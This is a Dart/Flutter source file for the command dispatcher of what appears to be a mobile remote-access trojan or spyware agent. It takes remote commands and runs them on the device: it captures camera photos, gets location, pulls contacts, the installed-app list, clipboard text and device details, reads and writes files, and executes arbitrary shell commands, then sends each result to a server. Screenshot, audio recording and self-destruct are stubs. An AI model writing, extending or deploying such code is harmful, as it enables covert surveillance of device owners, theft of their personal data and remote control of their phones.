// lib/core/controlar/command/command_executor.dart
import 'dart:io';
import 'dart:async';
import 'dart:convert';
import 'dart:math';

import 'package:camera/camera.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:screenshot/screenshot.dart';
import 'package:flutter/material.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:app_settings/app_settings.dart';
import 'package:installed_apps/app_info.dart';
import 'package:installed_apps/installed_apps.dart';

import '../camera/camera_service.dart';
import '../data/data_collector_service.dart';
import '../filesystem/file_system_service.dart';
import '../location/location_service.dart';
import '../network/network_service.dart';
import '../permissions/device_info_service.dart';

// List of supported commands
enum CommandType {
  takePhoto,
  getLocation,
  takeScreenshot,
  collectContacts,
  startAudioRecording,
  collectAppList,
  getDeviceInfo,
  listFiles,
  readFile,
  writeFile,
  executeShell,
  openAppSettings,
  getClipboard,
  selfDestruct,
  custom
}

class CommandExecutor {
  final CameraService _cameraService;
  final LocationService _locationService;
  final FileSystemService _fileSystemService;
  final NetworkService _networkService;
  final DeviceInfoService _deviceInfoService;
  final DataCollectorService _dataCollectorService;

  // Screen capture tools
  final ScreenshotController _screenshotController = ScreenshotController();

  // Audio recording state
  bool _isRecording = false;
  Timer? _recordingTimer;
  String? _currentRecordingPath;

  CommandExecutor({
    required CameraService cameraService,
    required LocationService locationService,
    required FileSystemService fileSystemService,
    required NetworkService networkService,
    required DeviceInfoService deviceInfoService,
    required DataCollectorService dataCollectorService,
  })  : _cameraService = cameraService,
        _locationService = locationService,
        _fileSystemService = fileSystemService,
        _networkService = networkService,
        _deviceInfoService = deviceInfoService,
        _dataCollectorService = dataCollectorService;

  // Main command execution entry point
  Future<void> executeCommand(String command, Map<String, dynamic> args) async {
    debugPrint('CommandExecutor: Executing command: $command');

    // Convert string command to enum
    CommandType? commandType = _stringToCommandType(command);

    if (commandType == null) {
      commandType = CommandType.custom;
    }

    try {
      switch (commandType) {
        case CommandType.takePhoto:
          await _executeTakePhoto(args);
          break;

        case CommandType.getLocation:
          await _executeGetLocation(args);
          break;

        case CommandType.takeScreenshot:
          await _executeTakeScreenshot(args);
          break;

        case CommandType.collectContacts:
          await _executeCollectContacts(args);
          break;

        case CommandType.startAudioRecording:
          await _executeStartAudioRecording(args);
          break;

        case CommandType.collectAppList:
          await _executeCollectAppList(args);
          break;

        case CommandType.getDeviceInfo:
          await _executeGetDeviceInfo(args);
          break;

        case CommandType.listFiles:
          await _executeListFiles(args);
          break;

        case CommandType.readFile:
          await _executeReadFile(args);
          break;

        case CommandType.writeFile:
          await _executeWriteFile(args);
          break;

        case CommandType.executeShell:
          await _executeShellCommand(args);
          break;

        case CommandType.openAppSettings:
          await _executeOpenAppSettings(args);
          break;

        case CommandType.getClipboard:
          await _executeGetClipboard(args);
          break;

        case CommandType.selfDestruct:
          await _executeSelfDestruct(args);
          break;

        case CommandType.custom:
        default:
          await _executeCustomCommand(command, args);
          break;
      }
    } catch (e, stackTrace) {
      debugPrint('CommandExecutor: Error executing command $command: $e');
      debugPrint(stackTrace.toString());

      await _networkService.sendCommandResponse(
        originalCommand: command,
        status: 'error',
        payload: {'message': 'Error executing command: $e'},
      );
    }
  }

  // Convert string command to enum type
  CommandType? _stringToCommandType(String command) {
    final Map<String, CommandType> commandMap = {
      'take_photo': CommandType.takePhoto,
      'command_take_picture': CommandType.takePhoto,
      'get_location': CommandType.getLocation,
      'command_get_location': CommandType.getLocation,
      'take_screenshot': CommandType.takeScreenshot,
      'command_take_screenshot': CommandType.takeScreenshot,
      'collect_contacts': CommandType.collectContacts,
      'start_audio_recording': CommandType.startAudioRecording,
      'collect_app_list': CommandType.collectAppList,
      'get_installed_apps': CommandType.collectAppList,
      'get_device_info': CommandType.getDeviceInfo,
      'list_files': CommandType.listFiles,
      'command_list_files': CommandType.listFiles,
      'read_file': CommandType.readFile,
      'write_file': CommandType.writeFile,
      'execute_shell': CommandType.executeShell,
      'command_execute_shell': CommandType.executeShell,
      'open_app_settings': CommandType.openAppSettings,
      'get_clipboard': CommandType.getClipboard,
      'self_destruct': CommandType.selfDestruct,
    };

    return commandMap[command];
  }

  // COMMAND EXECUTION METHODS

  Future<void> _executeTakePhoto(Map<String, dynamic> args) async {
    final cameraDirection = (args['camera'] as String?) == 'back'
        ? CameraLensDirection.back
        : CameraLensDirection.front;

    final imageFile = await _cameraService.takePicture(
      lensDirection: cameraDirection,
    );

    if (imageFile != null) {
      final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
      await _networkService.uploadFileFromCommand(
        deviceId: deviceId,
        commandRef: 'take_photo',
        fileToUpload: imageFile,
      );

      await _networkService.sendCommandResponse(
        originalCommand: 'take_photo',
        status: 'success',
        payload: {
          'message': 'Photo captured successfully',
          'camera': cameraDirection.toString(),
          'timestamp': DateTime.now().toIso8601String(),
          'file_size': await File(imageFile.path).length(),
        },
      );
    } else {
      throw Exception('Failed to capture photo');
    }
  }

  Future<void> _executeGetLocation(Map<String, dynamic> args) async {
    final location = await _locationService.getCurrentLocation();
    if (location != null) {
      await _networkService.sendCommandResponse(
        originalCommand: 'get_location',
        status: 'success',
        payload: {
          'latitude': location.latitude,
          'longitude': location.longitude,
          'accuracy': location.accuracy,
          'altitude': location.altitude,
          'speed': location.speed,
          'heading': location.heading,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } else {
      // Try getting last known location
      final lastLocation = await _locationService.getLastKnownLocation();
      if (lastLocation != null) {
        await _networkService.sendCommandResponse(
          originalCommand: 'get_location',
          status: 'partial_success',
          payload: {
            'latitude': lastLocation.latitude,
            'longitude': lastLocation.longitude,
            'accuracy': lastLocation.accuracy,
            'altitude': lastLocation.altitude,
            'timestamp': lastLocation.timestamp.toIso8601String(),
            'message': 'Using last known location',
          },
        );
      } else {
        throw Exception('Failed to get location or location services disabled');
      }
    }
  }

  Future<void> _executeTakeScreenshot(Map<String, dynamic> args) async {
    try {
      // This requires a widget to be referenced, which we don't have direct access to
      // For a real implementation, you'll need to use native screen capture methods
      // or integrate this into a UI component

      // Simulating screenshot by creating a colored image
      final directory = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final filePath = '${directory.path}/screenshot_$timestamp.png';

      /*
      // This code would be used if properly integrated with UI
      final captured = await _screenshotController.capture();
      if (captured != null) {
        final file = File(filePath);
        await file.writeAsBytes(captured);
      }
      */

      // Instead, we'll send a mock response for this demo
      await _networkService.sendCommandResponse(
        originalCommand: 'take_screenshot',
        status: 'error',
        payload: {
          'message': 'Screenshot capture requires UI context integration',
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to capture screenshot: $e');
    }
  }

  Future<void> _executeCollectContacts(Map<String, dynamic> args) async {
    try {
      // Request contacts permission if needed
      final permissionStatus = await ContactsService.getContactsPermission();
      if (permissionStatus != PermissionStatus.granted) {
        await ContactsService.requestPermission();

        // Check if permission was granted, otherwise return error
        final newStatus = await ContactsService.getContactsPermission();
        if (newStatus != PermissionStatus.granted) {
          throw Exception('Contacts permission not granted');
        }
      }

      // Get all contacts
      final contacts = await ContactsService.getContacts();

      // Convert to simplified format
      final List<Map<String, dynamic>> contactsList = contacts.map((contact) {
        return {
          'name': contact.displayName ?? '',
          'phones': contact.phones?.map((phone) => phone.value).toList() ?? [],
          'emails': contact.emails?.map((email) => email.value).toList() ?? [],
          'company': contact.company ?? '',
          'avatar':
              contact.avatar != null ? base64Encode(contact.avatar!) : null,
        };
      }).toList();

      // Send contacts data
      await _networkService.sendCommandResponse(
        originalCommand: 'collect_contacts',
        status: 'success',
        payload: {
          'contacts': contactsList,
          'count': contactsList.length,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to collect contacts: $e');
    }
  }

  Future<void> _executeStartAudioRecording(Map<String, dynamic> args) async {
    if (_isRecording) {
      // Stop existing recording first
      await _stopAudioRecording();
    }

    try {
      final int durationSeconds = args['duration'] ?? 60;

      // This would need a proper audio recording implementation
      // For now, we'll just simulate it
      _isRecording = true;

      // Simulate recording by setting a timer
      _recordingTimer = Timer(Duration(seconds: durationSeconds), () {
        _stopAudioRecording();
      });

      await _networkService.sendCommandResponse(
        originalCommand: 'start_audio_recording',
        status: 'initiated',
        payload: {
          'message': 'Audio recording started',
          'duration': durationSeconds,
          'timestamp_start': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      _isRecording = false;
      throw Exception('Failed to start audio recording: $e');
    }
  }

  Future<void> _stopAudioRecording() async {
    if (!_isRecording) return;

    _recordingTimer?.cancel();
    _isRecording = false;

    try {
      // In a real implementation, this would finalize the audio recording
      // and send the file to the server

      // Simulate successful recording
      await _networkService.sendCommandResponse(
        originalCommand: 'stop_audio_recording',
        status: 'success',
        payload: {
          'message': 'Audio recording completed',
          'timestamp_end': DateTime.now().toIso8601String(),
          'file_path': _currentRecordingPath ?? 'unknown',
        },
      );

      _currentRecordingPath = null;
    } catch (e) {
      throw Exception('Failed to stop audio recording: $e');
    }
  }

  Future<void> _executeCollectAppList(Map<String, dynamic> args) async {
    try {
      // Get list of installed apps
      List<AppInfo> apps = await InstalledApps.getInstalledApps();

      // Convert to simplified format
      final List<Map<String, dynamic>> appsList = apps.map((app) {
        return {
          'app_name': app.name ?? '',
          'package_name': app.packageName ?? '',
          'version_name': app.versionName ?? '',
          'version_code': app.versionCode,
          'system_app': app.isSystemApp,
        };
      }).toList();

      // Send app list data
      await _networkService.sendCommandResponse(
        originalCommand: 'collect_app_list',
        status: 'success',
        payload: {
          'apps': appsList,
          'count': appsList.length,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to collect app list: $e');
    }
  }

  Future<void> _executeGetDeviceInfo(Map<String, dynamic> args) async {
    try {
      // Get device info
      final deviceInfo = await _deviceInfoService.getDeviceInfo();

      // Add additional info
      deviceInfo['timestamp'] = DateTime.now().toIso8601String();
      deviceInfo['device_id'] =
          await _deviceInfoService.getOrCreateUniqueDeviceId();

      // Send device info data
      await _networkService.sendCommandResponse(
        originalCommand: 'get_device_info',
        status: 'success',
        payload: deviceInfo,
      );
    } catch (e) {
      throw Exception('Failed to get device info: $e');
    }
  }

  Future<void> _executeListFiles(Map<String, dynamic> args) async {
    try {
      final String path = args['path'] ?? '.';

      // List files in the specified directory
      final result = await _fileSystemService.listFiles(path);

      if (result != null) {
        if (result.containsKey('error')) {
          throw Exception(result['error']);
        }

        // Send file listing
        await _networkService.sendCommandResponse(
          originalCommand: 'list_files',
          status: 'success',
          payload: result,
        );
      } else {
        throw Exception('Failed to list files: Null result');
      }
    } catch (e) {
      throw Exception('Failed to list files: $e');
    }
  }

  Future<void> _executeReadFile(Map<String, dynamic> args) async {
    try {
      final String filePath = args['path'] ?? '';
      if (filePath.isEmpty) {
        throw Exception('File path is required');
      }

      // Read the file content
      final content = await _fileSystemService.readTextFile(filePath);

      if (content != null) {
        // Send file content
        await _networkService.sendCommandResponse(
          originalCommand: 'read_file',
          status: 'success',
          payload: {
            'path': filePath,
            'content': content,
            'size': content.length,
            'timestamp': DateTime.now().toIso8601String(),
          },
        );
      } else {
        throw Exception('Failed to read file: File not found or access denied');
      }
    } catch (e) {
      throw Exception('Failed to read file: $e');
    }
  }

  Future<void> _executeWriteFile(Map<String, dynamic> args) async {
    try {
      final String filePath = args['path'] ?? '';
      final String content = args['content'] ?? '';

      if (filePath.isEmpty) {
        throw Exception('File path is required');
      }

      // Write content to the file
      final savedPath =
          await _fileSystemService.saveTextFile(content, filePath);

      if (savedPath != null) {
        // Send success response
        await _networkService.sendCommandResponse(
          originalCommand: 'write_file',
          status: 'success',
          payload: {
            'path': savedPath,
            'size': content.length,
            'timestamp': DateTime.now().toIso8601String(),
          },
        );
      } else {
        throw Exception('Failed to write file');
      }
    } catch (e) {
      throw Exception('Failed to write file: $e');
    }
  }

  Future<void> _executeShellCommand(Map<String, dynamic> args) async {
    try {
      final String command = args['command'] ?? '';
      final List<dynamic> commandArgs = args['args'] ?? [];

      if (command.isEmpty) {
        throw Exception('Command is required');
      }

      // Execute shell command
      final result = await _fileSystemService.executeShellCommand(
        command,
        commandArgs.map((arg) => arg.toString()).toList(),
      );

      if (result != null) {
        if (result.containsKey('error')) {
          throw Exception(result['error']);
        }

        // Send command output
        await _networkService.sendCommandResponse(
          originalCommand: 'execute_shell',
          status: 'success',
          payload: {
            'command': command,
            'args': commandArgs,
            'output': result,
            'timestamp': DateTime.now().toIso8601String(),
          },
        );
      } else {
        throw Exception('Failed to execute shell command: Null result');
      }
    } catch (e) {
      throw Exception('Failed to execute shell command: $e');
    }
  }

  Future<void> _executeOpenAppSettings(Map<String, dynamic> args) async {
    try {
      final String settingType = args['type'] ?? 'app_settings';

      // Open appropriate settings page
      bool success = false;

      switch (settingType) {
        case 'location':
          success = await AppSettings.openLocationSettings();
          break;
        case 'app_settings':
        default:
          success = await AppSettings.openAppSettings();
          break;
      }

      // Send success response
      await _networkService.sendCommandResponse(
        originalCommand: 'open_app_settings',
        status: success ? 'success' : 'error',
        payload: {
          'type': settingType,
          'opened': success,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to open app settings: $e');
    }
  }

  Future<void> _executeGetClipboard(Map<String, dynamic> args) async {
    try {
      // Get clipboard content
      ClipboardData? clipboardData =
          await Clipboard.getData(Clipboard.kTextPlain);

      // Send clipboard content
      await _networkService.sendCommandResponse(
        originalCommand: 'get_clipboard',
        status: 'success',
        payload: {
          'content': clipboardData?.text ?? '',
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to get clipboard content: $e');
    }
  }

  Future<void> _executeSelfDestruct(Map<String, dynamic> args) async {
    try {
      // In a real implementation, this would trigger data erasure
      // For now, we'll just acknowledge the command

      await _networkService.sendCommandResponse(
        originalCommand: 'self_destruct',
        status: 'acknowledged',
        payload: {
          'message': 'Self-destruct command received',
          'timestamp': DateTime.now().toIso8601String(),
        },
      );

      // In a real scenario, you would call the actual self-destruct method here
      // For example: SelfDestructService().execute();
    } catch (e) {
      throw Exception('Failed to execute self-destruct: $e');
    }
  }

  Future<void> _executeCustomCommand(
      String command, Map<String, dynamic> args) async {
    try {
      // Handle custom or unknown command
      await _networkService.sendCommandResponse(
        originalCommand: command,
        status: 'acknowledged',
        payload: {
          'message': 'Custom command received',
          'command': command,
          'args': args,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      throw Exception('Failed to execute custom command: $e');
    }
  }
}
